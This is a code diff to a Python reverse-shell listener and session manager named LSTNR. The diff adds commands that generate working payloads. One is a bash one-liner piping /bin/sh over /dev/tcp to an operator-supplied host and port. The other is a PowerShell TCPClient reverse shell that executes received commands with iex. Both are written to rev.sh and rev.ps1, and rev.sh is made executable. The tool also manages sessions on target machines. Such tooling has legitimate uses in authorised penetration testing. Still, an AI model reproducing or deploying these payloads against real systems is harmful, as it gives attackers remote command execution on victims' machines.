@@ -64,25 +64,29 @@ def print_error(error_message):
 
 def print_menu():
     """Prints a formal list of available commands."""
-    message = f"""{ORANGE}\n╔═══════════════════════════════════════════════════════════════╗
-║                         MENU COMMANDS                         ║
-╠═══════════════════════════════════════════════════════════════╣
-║ help | ?        - Show this help menu                         ║
-║ ls              - List active sessions                        ║
-║ cs <id>         - Connect to a specific session by ID         ║
-║ die             - Kill all sessions                           ║
-║ exit            - Kill all sessions and shuts down LSTNR      ║
-╠═══════════════════════════════════════════════════════════════╣
-║                       SESSION COMMANDS                        ║
-╠═══════════════════════════════════════════════════════════════╣
-║ whoami          - Updates the session table                   ║
-║ hostname        - Updates the session table                   ║
-║ bs | CTRL+c     - Background the current session              ║
-║ stable          - TTY shell upgrade for Linux systems         ║
-║ payload windows - Builds a rev.ps1 on TGT and a new session   ║
-║ payload linux   - Builds a rev.sh on TGT and a new session    ║
-║ die             - Kills the current session                   ║
-╚═══════════════════════════════════════════════════════════════╝{RESET}\n"""
+    message = f"""{ORANGE}
+╔════════════════════════════════════════════════════════════════════════╗
+║                           MENU COMMANDS                                ║
+╠════════════════════════════════════════════════════════════════════════╣
+║ Show this help menu                                           help | ? ║
+║ List active sessions                                                ls ║
+║ Connect to a session by ID                                     cs <id> ║
+║ Save rev.sh locally            payload linux -lhost <IP> -lport <PORT> ║
+║ Save rev.ps1 locally         payload windows -lhost <IP> -lport <PORT> ║
+║ Kill all sessions                                                  die ║
+║ Kill all and shutdown LSTNR                                       exit ║
+╠════════════════════════════════════════════════════════════════════════╣
+║                         SESSION COMMANDS                               ║
+╠════════════════════════════════════════════════════════════════════════╣
+║ Update session info                                             whoami ║
+║ Update session info                                           hostname ║
+║ Background current session                                 bs | CTRL+C ║
+║ Upgrade TTY shell (Linux)                                       stable ║
+║ Build rev.ps1 on TGT and connect                       payload windows ║
+║ Build rev.sh on TGT and connect                          payload linux ║
+║ Kill current session                                               die ║
+╚════════════════════════════════════════════════════════════════════════╝{RESET}
+"""
     print(message)
     log_to_file("Displayed menu.")
 
@@ -317,17 +321,18 @@ def session_manager():
             
             # Log the command input
             log_to_file(f"LSTNR$ {command}")
-            
+# help            
             if command == "help" or command == "?":
                 print_menu()  # Show menu only if help or ? is typed
+# nothing
             elif command == "": 
                 # If the command is empty, do nothing and continue waiting for input
                 continue
+# list sessions         
             elif command.lower() == "ls":
                 # Display new connection notification first if available
                 while not notifications.empty():
                     print(notifications.get())  # Print the notifications for new connections
-
                 # Prepare the session list in a formatted way
                 session_list = []
                 for sid, session in sessions.items():
@@ -337,16 +342,13 @@ def session_manager():
                         "user": session.get('whoami', 'N/A'),
                         "hostname": session.get('hostname', 'N/A')
                     })
-
                 # Now print the formatted session table
                 formatted_table = format_session_table(session_list)
                 print(formatted_table)
-
                 # Log the session table into the file
                 log_to_file("Session list displayed:")
                 log_to_file(formatted_table)
-
-                
+# connect session                
             elif command.startswith("cs "):
                 try:
                     sid = int(command.split()[1])
@@ -356,6 +358,92 @@ def session_manager():
                         print_error("Invalid session ID.")
                 except:
                     print_error("Invalid command. Usage: cs <session_id>")
+# payload usage
+            elif command.lower().startswith("payload") and len(command.split()) < 6:
+                print(f"{ORANGE}[*] Payload Usage:{RESET}")
+                print(f"  Linux:   payload linux -lhost <IP> -lport <PORT>")
+                print(f"  Windows: payload windows -lhost <IP> -lport <PORT>")
+                continue
+
+# windows rev.ps1
+            elif command.lower().startswith("payload windows -lhost"):
+                try:
+                    # Split the command into parts
+                    parts = command.split()
+
+                    # debugging step to see what the split command looks like
+                    #print(f"Parts: {parts}")  # Print the parts to see how it's being split
+
+                    # Ensure there are exactly 6 parts and the correct flags are present in the right order
+                    if len(parts) != 6 or parts[1].lower() != "windows" or parts[2].lower() != "-lhost" or parts[4].lower() != "-lport":
+                        print_error("Usage: payload windows -lhost <IP> -lport <port>")
+                        continue
+                    
+                    # Get the listener IP and port from the command
+                    listener_ip = parts[3]  # IP address from the fourth argument
+                    listener_port = int(parts[5])  # Port from the sixth argument (cast to integer)
+
+                    # Prepare the PowerShell reverse shell payload
+                    ps_payload = f"""$client = New-Object System.Net.Sockets.TCPClient('{listener_ip}', {listener_port});
+            $stream = $client.GetStream();
+            [byte[]]$bytes = 0..65535|%{{0}}; 
+            while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
+                $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+                $sendback = (iex $data 2>&1 | Out-String );
+                $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+                $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+                $stream.Write($sendbyte,0,$sendbyte.Length);
+                $stream.Flush();
+            }}
+            $client.Close();"""
+                    # Write the payload to rev.ps1
+                    with open("rev.ps1", "w", encoding="utf-8") as f:
+                        f.write(ps_payload)
+                    # Print success and log it
+                    print(f"{YELLOW}[+] Windows payload saved locally as rev.ps1 with LHOST {listener_ip} and LPORT {listener_port}{RESET}")
+                    log_to_file(f"[+] Windows payload saved as rev.ps1 with LHOST {listener_ip} and LPORT {listener_port}")
+                except Exception as e:
+                    print_error(f"[!] Error creating Windows payload: {e}")
+                continue
+# linux rev.sh
+            elif command.lower().startswith("payload linux -lhost"):
+                try:
+                    # Split the command into parts
+                    parts = command.split()
+
+                    # Debugging step to see what the split command looks like
+                    #print(f"Parts: {parts}")  # Print the parts to see how it's being split
+
+                    # Ensure there are exactly 6 parts and the correct flags are present in the right order
+                    if len(parts) != 6 or parts[1].lower() != "linux" or parts[2].lower() != "-lhost" or parts[4].lower() != "-lport":
+                        print_error("Usage: payload linux -lhost <IP> -lport <port>")
+                        continue
+                    
+                    # Get the listener IP and port from the command
+                    listener_ip = parts[3]  # IP address from the fourth argument
+                    listener_port = int(parts[5])  # Port from the sixth argument (cast to integer)
+
+                    # Prepare the bash reverse shell payload
+                    bash_payload = f"/bin/sh -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1"
+
+                    # Write the payload to rev.sh
+                    with open("rev.sh", "w", encoding="utf-8") as f:
+                        f.write(bash_payload)
+
+                    # Make the rev.sh file executable
+                    os.chmod("rev.sh", 0o755)
+
+                    print(f"{YELLOW}[+] Linux payload saved locally as rev.sh with LHOST {listener_ip} and LPORT {listener_port}{RESET}")
+                    log_to_file(f"[+] Linux payload saved as rev.sh with LHOST {listener_ip} and LPORT {listener_port}")
+
+                except Exception as e:
+                    print_error(f"[!] Error creating Linux payload: {e}")
+                continue
+
+
+
+
+# kill all sessions
             elif command.lower() == "die":
                 print(f"{ORANGE}[!] Killing all sessions.{RESET}")
                 log_to_file("[!] Killing all sessions.")
@@ -366,6 +454,7 @@ def session_manager():
                         del sessions[sid]
                 print(f"{ORANGE}[+] All sessions killed.{RESET}")
                 log_to_file("[+] All sessions killed.")
+# shutdown lstnr
             elif command.lower() == "exit":
                 print(f"{ORANGE}[!] Killing all sessions.{RESET}")
                 print(f"{PINK}[+] Shutting down LSTNR.{RESET}")
